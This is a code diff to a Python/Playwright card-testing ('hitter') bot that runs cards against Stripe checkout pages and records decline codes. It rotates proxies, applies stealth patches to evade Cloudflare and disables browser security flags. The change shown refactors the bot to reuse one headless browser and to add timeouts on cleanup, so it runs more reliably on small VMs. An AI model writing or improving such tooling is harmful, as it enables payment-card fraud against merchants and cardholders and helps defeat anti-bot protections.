@@ -1547,7 +1547,9 @@ async def single_hit(browser, url: str, card: Dict, attempt: int, autofill_class
         result['decline_code'] = 'exception'
         result['response_time'] = time.time() - start
     finally:
-        if context: await context.close() # Destroy ephemeral context
+        if context:
+            try: await asyncio.wait_for(context.close(), timeout=2.0)
+            except: pass
     return result
 
 class ConcurrentHitter:
@@ -1563,49 +1565,49 @@ class ConcurrentHitter:
         self.update_callback = update_callback
         self.is_running = True
         
-    async def analyze_first(self):
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage','--disable-web-security','--disable-site-isolation-trials'])
-            
-            max_retries = 2
-            for attempt in range(max_retries):
-                try:
-                    proxy_data = await ProxyManager.get_random(self.user_id)
-                    playwright_proxy = ProxyManager.format_for_playwright(proxy_data) if proxy_data else None
-                    
-                    context = await browser.new_context(
-                        proxy=playwright_proxy,
-                        ignore_https_errors=True
-                    )
-                    
-                    page = await context.new_page()
-                    
-                    # 1% CODER: Apply Stealth even to the initial analyzer to avoid Cloudflare taint
-                    await Stealth().apply_stealth_async(page)
+    async def analyze_first(self, browser):
+        max_retries = 2
+        for attempt in range(max_retries):
+            context = None
+            try:
+                proxy_data = await ProxyManager.get_random(self.user_id)
+                playwright_proxy = ProxyManager.format_for_playwright(proxy_data) if proxy_data else None
+                
+                context = await browser.new_context(
+                    proxy=playwright_proxy,
+                    ignore_https_errors=True
+                )
+                
+                page = await context.new_page()
+                
+                # 1% CODER: Apply Stealth even to the initial analyzer to avoid Cloudflare taint
+                await Stealth().apply_stealth_async(page)
 
-                    
-                    await page.goto(self.url, timeout=15000, wait_until='domcontentloaded')
-                    await asyncio.sleep(2)
-                    self.url_info = await URLAnalyzer.analyze(self.user_id, page, self.url)
-                    await context.close()
-                    break # Success!
-                except Exception as e:
-                    err_str = str(e)
-                    print(f"DEBUG: analyze_first() attempt {attempt} failed: {err_str}")
-                    should_remove = False
-                    if proxy_data:
-                        if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
-                            should_remove = True
-                            
-                    if should_remove:
-                        # DEBUG: Temporarily disable auto-delete
-                        # await ProxyManager.remove(self.user_id, proxy_data['raw'])
-                        pass
-                    if context: await context.close()
-                    if attempt == max_retries - 1:
-                        self.url_info = {'amount': None, 'merchant': 'Unknown'} # Fallback
-            
-            await browser.close()
+                
+                await page.goto(self.url, timeout=15000, wait_until='domcontentloaded')
+                await asyncio.sleep(2)
+                self.url_info = await URLAnalyzer.analyze(self.user_id, page, self.url)
+                try: await asyncio.wait_for(context.close(), timeout=2.0)
+                except: pass
+                break # Success!
+            except Exception as e:
+                err_str = str(e)
+                print(f"DEBUG: analyze_first() attempt {attempt} failed: {err_str}")
+                should_remove = False
+                if proxy_data:
+                    if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
+                        should_remove = True
+                        
+                if should_remove:
+                    # DEBUG: Temporarily disable auto-delete
+                    # await ProxyManager.remove(self.user_id, proxy_data['raw'])
+                    pass
+                if context:
+                    try: await asyncio.wait_for(context.close(), timeout=2.0)
+                    except: pass
+                if attempt == max_retries - 1:
+                    self.url_info = {'amount': None, 'merchant': 'Unknown'} # Fallback
+        
         return self.url_info
 
     async def _worker(self, queue: asyncio.Queue, browser, autofill_class):
@@ -1665,10 +1667,11 @@ class ConcurrentHitter:
             if self.update_callback:
                 await self.update_callback({"status": "analyzing"})
                 
-            await self.analyze_first()
-            
             async with async_playwright() as p:
+                # 1% CODER: Launch Chromium once to prevent RAM exhaust on 512MB VMs
                 browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage','--disable-web-security','--disable-site-isolation-trials'])
+                
+                await self.analyze_first(browser)
                 
                 max_retries = 2
                 autofill_class = StripeV2_ElementsIframe
@@ -1687,7 +1690,8 @@ class ConcurrentHitter:
                         
                         await test_page.goto(self.url, timeout=15000, wait_until='domcontentloaded')
                         autofill_class = await AutofillSelector.detect(test_page, self.url)
-                        await context.close()
+                        try: await asyncio.wait_for(context.close(), timeout=2.0)
+                        except: pass
                         break
                     except Exception as e:
                         err_str = str(e)
@@ -1701,7 +1705,9 @@ class ConcurrentHitter:
                             # DEBUG: Temporarily disable auto-delete
                             # await ProxyManager.remove(self.user_id, proxy_data['raw'])
                             pass
-                        if context: await context.close()
+                        if context:
+                            try: await asyncio.wait_for(context.close(), timeout=2.0)
+                            except: pass
                         pass
                 
                 if self.update_callback:
@@ -1720,7 +1726,8 @@ class ConcurrentHitter:
                 for w in workers:
                     w.cancel()
                     
-                await browser.close()
+                try: await asyncio.wait_for(browser.close(), timeout=5.0)
+                except: pass
                 
             if self.update_callback:
                 await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
